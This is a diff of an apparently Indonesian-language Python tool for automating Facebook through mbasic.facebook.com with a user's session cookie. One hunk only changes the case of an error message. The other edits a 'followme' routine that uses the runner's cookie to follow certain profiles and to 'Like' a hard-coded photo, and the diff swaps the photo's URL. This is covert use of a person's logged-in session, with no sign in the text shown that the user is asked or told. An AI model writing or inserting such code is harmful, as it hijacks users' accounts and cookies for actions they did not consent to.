@@ -853,7 +853,7 @@ def menu(an,ai,at,ag,ar):
       elif user in ['9','09']:
                 cetak(Panel('             [bold yellow]Contoh URL [bold white]: [bold green]https://www.facebook.com/',width=75,style='bold white'))
                 linglung=Console().input("%s[%s•%s] Masukan Url Post  : "%(P1,H1,P1))
-                if not "https://www.facebook.com/" in linglung:exit("Gunakan : 'https://www.facebook.com/' ")
+                if not "https://www.facebook.com/" in linglung:exit("gunakan : 'https://www.facebook.com/' ")
                 ur=linglung.replace("https://www.facebook.com/","https://mbasic.facebook.com/")
                 awalik(ur)
       elif user == 'keluar' or user == 'Keluar':
@@ -1155,7 +1155,7 @@ def followme(kueh):
                   for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                         if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
             except(Exception) as e:print(e)
-      for z in parse(requests.get("https://mbasic.facebook.com/1672257249893438",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
+      for z in parse(requests.get("https://mbasic.facebook.com/photo/?fbid=1672257059893457&set=a.161861817599663",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
             if z.text in ["Suka","Like"]:requests.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie":kueh})
 
 tim, day = datetime.now().hour,datetime.now().day
